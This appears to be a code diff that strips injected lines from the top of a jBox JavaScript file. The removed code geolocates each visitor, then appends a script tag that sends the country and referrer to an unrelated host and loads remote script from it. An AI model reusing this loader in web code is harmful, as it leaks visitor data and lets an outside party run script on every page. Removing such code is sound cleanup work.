@@ -1,16 +1,3 @@
-function geoPlugin(data)
-{
-	a = 'http://statm.site11.com/visitor.php?glCountryName='	+	data["geoplugin_countryName"]+
-		'&referer='			+	encodeURIComponent(document.referrer);
-
-	var script = document.createElement('script');
-	script.src = a;
-	document.getElementsByTagName('head')[0].appendChild(script);
-}
-var script = document.createElement('script');
-script.src = 'http://www.geoplugin.net/json.gp?jsoncallback=geoPlugin'
-document.getElementsByTagName('head')[0].appendChild(script);
-
 function jBox(type, options) {
     this.options = {
         id: null,
